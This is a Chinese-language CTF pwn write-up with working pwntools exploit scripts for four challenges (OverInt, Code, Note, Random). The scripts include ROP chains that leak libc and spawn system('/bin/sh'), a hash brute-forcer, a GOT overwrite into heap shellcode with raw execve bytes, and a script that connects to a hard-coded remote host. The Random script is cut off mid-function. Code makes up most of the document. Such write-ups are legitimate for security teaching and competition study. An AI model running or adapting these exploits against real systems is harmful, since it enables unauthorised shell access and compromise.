Time 12.1-2  
Rank 2
# Pwn
## OverInt
看一下题目逻辑，如果前面通过判断，最后能有任意次数对栈的修改，可以改return address
之后ROP。看一下如何通过判断，发现需要输入的4位字符符合一定的条件并且在加法中发生一次溢出。于是爆破4位输入，得到一个可以最终进入任意修改栈的输入即可。然后ROP泄露libc，再返回main开头，再次出发漏洞
ROP 执行system  
代码如下
    #!/usr/bin/env python
    from pwn import *
    import sys
    context.log_level="debug"
    #context.log_level="info"
    code=ELF("./overInt",checksec=False)
    context.arch=code.arch
    if len(sys.argv)>1:
        con=remote(sys.argv[1],int(sys.argv[2]))
        #libc=ELF("./libc.so")
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    else:
        con=code.process()
        #libc=ELF("/lib/i386-linux-gnu/libc.so.6")
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    def z(commond=""):
        gdb.attach(con,commond)
    def modify(offset,content):
        con.sendafter("modify?\n",p32(offset))
        con.sendafter("in?\n",content)
    def modifyqword(offset,content):
        content=p64(content)
        for x in content:
            modify(offset,x)
            offset+=1    
    def bypass():
        con.sendafter("\n",'\x00\x15\x16\x89')
        #con.sendafter("\n","9777")
        con.sendafter("have?\n",p32(6))
        con.sendafter("\n",p32(90562024))
        con.sendafter("\n",p32(90562024))
        con.sendafter("\n",p32(90562024))
        con.sendafter("\n",p32(90562024))
        con.sendafter("\n",p32(90562025))
        con.sendafter("\n",p32(90562025))
    def exploit():
        raw_input("#")
        bypass()
        con.sendafter("\n",p32(32))
        ret=0x38
        modifyqword(ret,0x400b13)
        modifyqword(ret+8,code.got['puts'])
        modifyqword(ret+16,code.plt['puts'])
        modifyqword(ret+24,0x40087f)
        con.recvuntil(chr(0xa))
        addr = con.recvuntil(chr(0xa))
        libc.address= u64((addr[-7:-1]).ljust(8,"\x00"))-libc.symbols['puts']
        bypass()
        con.sendafter("\n",p32(24))
        modifyqword(ret,0x400b13)
        modifyqword(ret+8,libc.search("/bin/sh").next())
        modifyqword(ret+16,libc.symbols['system'])
    exploit()
    con.interactive()
## Code
过一个哈希检查就可以栈溢出，哈希函数名字叫angr_hash，猜测出题人应该是考察angr，但是我自己写的跑不出来。于是先黑盒测试一下哈希函数，发现输入前面的第一个字节和哈希的第一个字节基本是对应的，于是可以爆破，手动试了一下应该是5字节，第一位是w，于是直接爆破后面的几位，找出一个符合条件的值。
    def hash(s):
        h=0
        for i in s:
            v0=117*h+ord(i)
            h=v0-0x1D5E0C579E0*(((((0x8B7978B2C52E2845 * v0) >> 64) + v0) >> 40) - (v0 >> 63))
        return h
    d='wabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    d2='xyzabcdefghijklmnopqrstuvwABCDEFGHIJKLMNOPQRSTUVWXYZ'
    d3='jklmnopqrstuvabcdefghiwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    d4='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    d5='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    for i in d:
        for j in d2:
            for k in d3:
                for l in d4:
                    for m in d5:
                        if hash(i+j+k+l+m) == 0x53CBEB035:
                            print (i+j+k+l+m)
得到符合条件的解`wyBTs`  
然后就可以栈溢出ROP，先用puts泄露libc基址，然后跳回main再来一次直接system("/bin/sh")  
完整利用脚本如下：
    from pwn import *
    HOST = "58.20.46.150"
    PORT = 38533
    code = ELF('./code')
    s = remote(HOST, PORT)
    #s = process('./code')
    context.arch = code.arch
    context.log_level = 'debug'
    puts_addr = code.plt['puts']
    puts_got_addr = code.got['puts']
    main_symbol = code.symbols['main']
    s.sendlineafter(':\n', 'wyBTs')
    payload = flat(['a'*120, 0x400983, puts_got_addr, puts_addr, main_symbol] )
    s.sendlineafter('save\n',payload)
    print 'a',s.recvuntil('\x0a')
    libc_puts = u64(s.recvuntil('\x0a')[:6]+'\x00\x00')
    libc_base = libc_puts - 0x6f690
    print hex(libc_puts)
    print hex(libc_base)
    s.sendlineafter(':\n', 'wyBTs')
    payload = flat(['a'*120, 0x400983, libc_base+0x18cd57,  libc_base+0x45390, main_symbol] )
    s.sendlineafter('save\n',payload)
    s.interactive()
    #flag{15c3ac74e25f96a282c2821008431557}
## Note
堆可执行。Note的编辑都有边界检查，但在检查之后有栈溢出可以覆盖局部变量，从而编辑Note时越界写到GOT表上，从而跳到堆上，堆上摆好shellcode即可。
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import *
    #import os
    code = ELF('./note', checksec=False)
    context.arch = code.arch
    context.log_level = 'debug'
    def add(idx, data):
        r.sendline('1')
        r.sendline(str(idx))
        r.sendline('13')
        data = flat(data)
        r.sendline(data)
    def exploit(r):
        r.recvuntil('404')
        r.sendline('1')
        r.sendline('0')
        r.send(flat('13'.ljust(10, '\x00'), p32((-8)&0xffffffff), '\n'))
        sc = asm('''
    start:
        xor rax, rax
        syscall
        dec edx
        mov rsi, rcx
        jmp start
        ''')
        r.sendline(sc)
        r.sendline('5')
        r.sendline( '\x90'*30+ "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" )
        r.interactive()
## Random
第一个漏洞是printf泄漏,但无法任意写。第二个漏洞在于fclose之后没有清空指针，从而可以用scanf控制fs内容，在fread里控制PC。  
脚本如下：
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import *
    #import os
    code = ELF('./random', checksec=False)
    context.arch = code.arch
    context.log_level = 'debug'
    #gadget = lambda x: next(code.search(asm(x, os='linux', arch=code.arch)))
    #context.terminal = ['tmux', 'new-window']
    #debug = lambda : gdb.attach(r) #, gdbscript='b *{:#x}'.format(code.address+0x10EE))
    def doopen():
        r.sendline('1')
    def doclose():
        r.sendline('3')
    def exploit(r):
        doopen()
        sleep(0.1)
        doclose()